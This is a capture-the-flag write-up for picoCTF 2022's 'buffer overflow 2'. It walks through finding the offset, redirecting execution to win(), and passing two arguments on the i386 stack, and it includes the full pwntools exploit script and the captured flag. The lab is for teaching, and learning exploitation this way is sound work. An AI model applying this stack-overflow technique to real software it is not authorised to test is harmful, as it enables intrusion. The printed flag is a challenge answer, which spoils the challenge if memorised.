# buffer overflow 2 #
 
## Overview ##

Category: [Binary Exploitation](../../)

Topics: Binary Exploitation, picoCTF-2022, Buffer Overflow, i386 Calling Convention

## Description ##
Control the return address and arguments
This time you'll need to control the arguments to the function you return to! Can you get the flag from this program?
You can view source here.

## Approach ##
I am provided with a binary file called `vuln` and a C file called `vuln.c`. I first check the binary security via `checksec`:

    Arch:     i386
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No

There isn't any important security feature like PIE or Canary to worry about. So I move on to analyzing the C file. It contains the `win` function that prints the flag, but only prints if the arguments match specific values (arg1 = 0xCAFEF00D and arg2 = 0xF00DF00D):

    void win(unsigned int arg1, unsigned int arg2) {
    char buf[FLAGSIZE];
    FILE *f = fopen("flag.txt","r");
    if (f == NULL) {
        printf("%s %s", "Please create 'flag.txt' in this directory with your",
                        "own debugging flag.\n");
        exit(0);
    }

    fgets(buf,FLAGSIZE,f);
    if (arg1 != 0xCAFEF00D)
        return;
    if (arg2 != 0xF00DF00D)
        return;
    printf(buf);
    }

And there is the `vuln` function that takes in the user input via `gets` function:

    void vuln(){
    char buf[BUFSIZE];
    gets(buf);
    puts(buf);
    }

Since it uses `gets` function, I am able to overflow the buffer and redirect execution to the win function. First I need to find the offset to the return address, this can be easily done by using cyclic pattern:

    pwndbg> cyclic -l daab
    Finding cyclic pattern of 4 bytes: b'daab' (hex: 0x64616162)
    Found at offset 112

Now that I got the offset, I need to find the address of the `win` function. This can be done by using `info functions` in gdb:

    pwndbg> info function
    All defined functions:

    Non-debugging symbols:
    0x08049000  _init
    ...
    0x08049296  win
    ...
    0x0804946c  _fini

Then I wrote the payload script to see if it is able to return to `win` function instead of `main` function, here is the payload script:

    from pwn import *

    # Port will vary
    HOST = 'saturn.picoctf.net'
    PORT = 1234

    #p = remote(HOST, PORT)

    p = gdb.debug('./vuln', '''
    break win
    c
    '''
    )

    # Since this is i386 architecture, must be packed into 32-bits
    win_addr = 0x08049296

    payload = b'a'*112 + p32(win_addr)

    p.sendline(payload)

    p.interactive()

Result:

   0x804929e <win+8>     sub    esp, 0x54     ESP => 0xfff573f4 (0xfff57448 - 0x54)
   0x80492a1 <win+11>    call   __x86.get_pc_thunk.bx       <__x86.get_pc_thunk.bx>

   0x80492a6 <win+16>    add    ebx, 0x2d5a
   0x80492ac <win+22>    sub    esp, 8
   0x80492af <win+25>    lea    eax, [ebx - 0x1ff8]
   0x80492b5 <win+31>    push   eax
   0x80492b6 <win+32>    lea    eax, [ebx - 0x1ff6]
   0x80492bc <win+38>    push   eax
   0x80492bd <win+39>    call   fopen@plt                   <fopen@plt>

   0x80492c2 <win+44>    add    esp, 0x10
   0x80492c5 <win+47>    mov    dword ptr [ebp - 0xc], eax

It looks like I was able to redirect the return address to the `win` function, but I still need to pass the arguments to the function. Looking at the assembly code, I can see that at `0x804930c <win+118>` is where it is comparing values and seeing if it not equal to `0xcafef00d`. In order to figure out how many bytes I need in order to pass the arguments, I use cyclic to identify stack offsets after EIP, then use the output of the cyclic and append it to my payload:

    payload = b'a'*112 + p32(win_addr) + b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama'

After running the script, I found out that I am 4 bytes away:

    pwndbg> cyclic -l 0x61616162
    Finding cyclic pattern of 4 bytes: b'baaa' (hex: 0x62616161)
    Found at offset 4

After adding 4 bytes to the payload, I run the script to see if it works:

    0x804930c <win+118>    cmp    dword ptr [ebp + 8], 0xcafef00d     0xcafef00d - 0xcafef00d     EFLAGS => 0x246 [ cf PF af ZF sf IF df of ac ]
    0x8049313 <win+125>  x jne    win+153                     <win+153>

    0x8049315 <win+127>    cmp    dword ptr [ebp + 0xc], 0xf00df00d     0x61616161 - 0xf00df00d     EFLAGS => 0x213 [ CF pf AF zf sf IF df of ac ]

I noticed that I successfully overwrite the first argument on the stack, now it is using the second argument and checking if it is not equal to `0xf00df00d`. Repeating the same step to find the offset to the second argument, I notice that this time it is 0 byte away. Thus I just append `p32(0xf00df00d)` to the payload:

    payload = b'a'*112 + p32(win_addr) + b'a'*4 + p32(0xCAFEF00D) + p32(0xF00DF00D)

This time, I decided to test my script on the remote server and see if I got the flag:

    [+] Opening connection to saturn.picoctf.net on port 52791: Done
    [*] Switching to interactive mode
    Please enter your string:
    aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x96\x92\xf0\xfe\xca
    picoCTF{argum3nt5_4_d4yZ_59cd5643}

Success, I got the flag. Here is the final script:

    from pwn import *

    # Port will vary
    HOST = 'saturn.picoctf.net'
    PORT = 52791

    p = remote(HOST, PORT)

    #p = gdb.debug('./vuln', '''
    #break *0x804930c
    #c
    #'''
    #)

    # Since this is i386 architecture, must be packed into 32-bits
    win_addr = 0x08049296

    payload = b'a'*112 + p32(win_addr) + b'a'*4 + p32(0xCAFEF00D) + p32(0xF00DF00D)

    p.sendline(payload)

    p.interactive()

Flag: picoCTF{argum3nt5_4_d4yZ_59cd5643}

## Reflection ## 
This challenge is similar to the previous one (buffer overflow 1), but now I have to modify the arguments so when it is passed to the `win` function, it will pass the conditional check. Since I was not familiar with how arguments are handled on i386 architecture, I researched the calling convention and learned that i386 uses the cdecl calling convention, where function arguments are passed on the stack rather than in registers.

After the function prologue (push ebp; mov ebp, esp), the stack layout looks like this:

    ----------- Higher address
    arg2         <- [EBP + 12]
    arg1         <- [EBP + 8]
    return addr  <- [EBP + 4]
    saved EBP    <- [EBP]
    ----------- Lower address

This stack layout helped me understand how arguments are accessed and overwritten during a stack overflow. By using cyclic to determine the offset beyond the return address, I was able to correctly place padding followed by the desired argument values on the stack, allowing the program to pass the conditional checks and print the flag.